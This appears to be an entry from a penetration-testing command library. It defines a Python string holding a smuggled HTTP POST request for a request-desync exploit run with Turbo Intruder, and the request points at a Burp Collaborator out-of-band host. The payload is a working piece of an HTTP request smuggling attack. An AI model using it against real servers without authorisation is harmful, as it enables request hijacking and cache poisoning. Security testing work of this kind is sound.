---
data: >-
  prefix = '''POST /hopefully404 HTTP/1.1\nHost:
  o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\nContent-Type:
  application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1'''
tags:
  - scripting
  - http-smuggling
type: command
executor: python
platforms:
  - Web
id: 9cd57e01-f792-42a9-9201-608d1b4d2648
created_at: '2025-12-13T09:01:22.474Z'
updated_at: '2025-12-13T09:01:22.474Z'
verified: false
validated: true
submitted: true
---
# Define Smuggled Prefix

## Command

```python
prefix = '''POST /hopefully404 HTTP/1.1\nHost: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1'''
```

## Description

Defines the string for the smuggled HTTP request in the desync exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | No parameters | N/A |

## Examples

### Basic Usage

```python
prefix = '''POST /hopefully404 HTTP/1.1\nHost: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1'''
```

## Expected Output

Prefix string defined.

## Related

- [[procedures/Prepare-Turbo-Intruder-Desync-Script]]
